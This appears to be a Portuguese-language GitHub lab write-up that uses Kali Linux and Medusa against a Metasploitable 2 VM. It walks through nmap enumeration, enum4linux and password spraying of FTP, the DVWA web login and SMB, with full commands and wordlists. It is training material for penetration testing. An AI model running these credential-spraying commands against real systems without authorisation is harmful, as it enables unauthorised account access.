# PasswordSprayingMedusa
Desafio de Brute Force 
Programas e Ferramentas utilizadas: Kali Linux, Medusa e Metaexploitable 2.

1. Simulação Brute Force FTP
  a) Utilizando o comando Ping verificamos se a máquina vulnerável está responsiva:

      ping -c 3 192.168.15.43

   3 packets transmitted, 3 received, 0% packet loss, time 2040ms
      rtt min/avg/max/mdev - 0.023/0.029/0.042/0.009 ms

   Nenhum pacote enviado foi perdido o que demonstra que a máquina vulnerável está ativa para ser explorada.

  b) Enumeração utilizando Nmap
    Para identificarmos as vulnerabilidades FTP é necessário realizar a varredura de rede com Nmap:
    
    nmap -sV -p 21,22,80,445,138 192.168.15.43
    Com esse comando obtivemos o seguinte resultado:
    
<img width="863" height="272" alt="image" src="https://github.com/user-attachments/assets/8e9a35a4-125a-431e-b484-624ea04ef864" />

Conseguimos encontrar três portas vulneráveis

Porta     Estado      Serviço
21/tcp    Aberta      FTP
22/tcp    Aberta      SSH
80/tcp    Aberta      HTTP

Para validar se o serviço está mesmo ativo vamos testá-lo diretamente com o comando:

ftp 192.168.15.43

Onde obtivemos o seguinte retorno:

<img width="273" height="114" alt="image" src="https://github.com/user-attachments/assets/af5eb11c-4620-4153-afde-443070d3fe7c" />

O que significa que o serviço está mesmo disponível para exploração.

c)Criar usuários e senhas comuns para realizar o Password Spraying:
  Vamos primeiramente criar o arquivo correspondente aos nomes de usuários com o comando echo

  echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

  E agora definir as senhas que serão utilizadas para o ataque

  echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt

  Com os arquivos devidamente criados, utilizaremos o comando medusa para o ataque:

  medusa -h 192.168.15.43 -U users.txt -P pass.txt -M ftp -t 6
  
<img width="1410" height="378" alt="image" src="https://github.com/user-attachments/assets/eeba8e70-556a-49b8-aedc-e371dc9f16ea" />

Obtivemos então, sucesso ao acessar o serviço utilizando o usuário: msfadmin e a senha: msfadmin.

2. Automação de tentativas de usuários e senhas em serviços WEB
   a)Acessamos primeiramente o DVWA ao abrir o navegador e inserir o endereço:
   
   192.168.15.43/dvwa
   
  E utilizaremos as listas de usuários e senhas:

  echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

  echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt

  Vamos então iniciar o ataque com medusa:

    medusa -h 192.168.15.43 -U users.txt -P pass.txt -M http \
    -m PAGE: '/dvwa/login.php' \
    -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
    -m 'FAIL=Login Failed' -t 6
    
<img width="1423" height="827" alt="image" src="https://github.com/user-attachments/assets/644e1297-2f04-4acf-8803-c63cbf4d9b0a" />

Com esse ataque conseguimos todos os usuários e senhas válidos para login.

3.Enumeração SMB e Password Spraying
 a) Enumeração de usuários existentes e ativos:
    Antes de iniciar o ataque primeiro temos que identificar os usuários ativos para maior efetividade e evitar bloqueios de IP por tentativas de acesso como o comando enum4linux

    enum4linux -a 192.168.15.43 | tee enum4_output.txt

    Onde obtivemos o seguinte resultado:

    <img width="1249" height="852" alt="image" src="https://github.com/user-attachments/assets/5a65d6b0-e4e1-4bb7-86b5-3c062540ef4c" />

  b)Criando a lista de usuáruios para o ataque SMB
    
  echo -e "user\nmsfadmin\nservice > smb_users.txt

  echo -e "password\n123456\nWelcome\nmsfadmin" > senhas_spray.txt

  c) Iniciando o Password Spraying em SMB

  medusa -h 192.168.15.43 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

<img width="1450" height="274" alt="image" src="https://github.com/user-attachments/assets/ba454ff1-2828-4d55-a27c-7f10c955fc37" />

  Obtivemos então, sucesso ao acessar o serviço utilizando o usuário: msfadmin e a senha: msfadmin.

  d) Validação de acesso acessando diretamente o serviço SMB:

  <img width="819" height="352" alt="image" src="https://github.com/user-attachments/assets/a6fb8e1c-b95b-4306-a2ec-68b01065d487" />
  
Conseguimos acessar com sucesso o serviço

  
    
